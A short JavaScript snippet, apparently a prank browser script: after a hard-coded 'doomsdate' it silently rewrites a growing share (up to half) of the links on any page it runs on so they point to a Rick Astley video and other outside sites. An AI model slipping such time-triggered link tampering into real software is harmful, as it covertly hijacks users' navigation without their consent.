// Link and a percentage likelihood to replace your link.
var LINKS = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ',
				'https://www.google.gr',
				'https://www.ul-ts.com/',
				'https://www.youtube.com/watch?v=4pXfHLUlZf4&feature=youtu.be&t=28s'];

var doomsdate = 1441105869000;
var ratio = 0.1;
var increment = 900000; //is 15 minutes in miliseconds

var currentDate = new Date();

if(currentDate.getTime() > doomsdate){

	function getRandomLink(){
		return LINKS[Math.floor(Math.random() * LINKS.length)];
	}

    function getRatio(){
      var delta = currentDate.getTime() - doomsdate;
      if(delta > 0){
        var increments = Math.floor(delta / increment);
        if(increments < 1){
          return 0.05;
        }else{
          var adjustedRatio = increments * ratio;
          if(adjustedRatio <= 0.5){
            return adjustedRatio;
          }else{
            return 0.5;            
          }
        }
      }else{
        return 0.1;
      }
    }

    // Get all the links on the page.
    var linksOnPage = document.getElementsByTagName("a");
    
    // Replace ~RATIO of them with Rick Astley.
    for (var i = 0; i < linksOnPage.length; i++) {
        if (Math.random() < getRatio()) {
        linksOnPage[i].href = getRandomLink();
        }
    }
}
